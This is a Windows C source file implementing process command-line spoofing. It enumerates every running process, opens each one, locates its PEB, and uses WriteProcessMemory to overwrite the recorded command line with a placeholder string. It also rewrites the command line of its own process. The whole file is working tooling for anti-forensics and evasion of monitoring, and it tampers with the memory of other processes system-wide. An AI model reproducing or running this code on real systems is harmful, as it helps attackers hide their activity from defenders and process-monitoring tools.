#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include "helpers.h"
#include "PEstructs.h"
#include <tlhelp32.h>
#include <ntstatus.h>
#pragma comment (lib, "advapi32")
wchar_t source[ 25 ] = L"TROLLOOOLLL";

typedef NTSTATUS (*pNtQueryInformationProcess)(
  HANDLE           ProcessHandle,
  ULONG            ProcessInformationClass,
  PVOID            ProcessInformation,
  ULONG            ProcessInformationLength,
  PULONG           ReturnLength
);

 // Define a structure representing the PEB
struct PROCESS_BASIC_INFORMATION {
  PVOID Reserved1;
  int *PebBaseAddress;
  PVOID Reserved2[2];
  ULONG_PTR UniqueProcessId;
  PVOID Reserved3;
};


void change_current_cmdline()
{
#ifdef _M_IX86 
	PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
#else
	PEB * ProcEnvBlk = (PEB *)__readgsqword(0x60);
#endif

	wprintf(L"[+] Changing current process cmdline to: %ls\n", source);
	_RTL_USER_PROCESS_PARAMETERS * ProcessParameters = ProcEnvBlk->ProcessParameters;
	memset( ProcessParameters->CommandLine.Buffer, 0, 88);
	wcscpy( ProcessParameters->CommandLine.Buffer, source );
}

int change_cmdline(DWORD pid)
{
	// 1. Get a process Handle
	HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] Failed to open process. Error code: %d [-] Most probably you have permission issue\n", GetLastError());
        return 1;
    }
	printf("[+] Got handle of process ID: %d\n", pid, hProcess);
	
	// 2. Get NtQueryInformationProcess function address from ntdll.dll
	pNtQueryInformationProcess pNtQueryInfo = (pNtQueryInformationProcess) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess");
	printf("[+] Getting NtQueryInformationProcess() address: %p\n", pNtQueryInfo);
	
	// 3. Get remote process's PEB address
	PROCESS_BASIC_INFORMATION pbi;
	ULONG returnLength;
    NTSTATUS status = pNtQueryInfo(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
    if (status != 0) {
        printf("[-] Failed to query process information. Error code: %d", status);
        CloseHandle(hProcess);
        return 1;
    }
	
    PROCESS_BASIC_INFORMATION peb;
	PEB pp;
	
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &pp, sizeof(pp), &bytesRead)) {
        printf("[-] Failed to read PEB. Error code: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
	printf("[+] Got PEB address of PID: %d - %p\n", pid, pbi.PebBaseAddress);
	
	// 4. Access Process Parameters and change cmdline
	_RTL_USER_PROCESS_PARAMETERS params;
	
	ReadProcessMemory(hProcess, pp.ProcessParameters, &params, sizeof(params), &bytesRead);
	
	SIZE_T bytesOut;
	USHORT fakeSize = 0;
	fakeSize = wcslen(source) * 2;
	if (!WriteProcessMemory(hProcess, (char *)pp.ProcessParameters + offsetof(_RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), (void *) &fakeSize, sizeof(fakeSize), &bytesOut)) {
		printf("[-] Could not update CommandLine in remote PEB (%d)\n", GetLastError());
		return 1;
	}
	
	if (!WriteProcessMemory(hProcess, params.CommandLine.Buffer, (LPCVOID) source, sizeof(source), &bytesOut)) {
		printf("[-] Could not update CommandLine in remote PEB (%d)\n", GetLastError());
		return 1;
	}
	
    CloseHandle(hProcess);
	
}
int All_Target() {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32))
				change_cmdline(pe32.th32ProcessID);
                
        CloseHandle(hProcSnap);
       
		return 0;
}
int main() 
{
	DWORD pid = All_Target();
}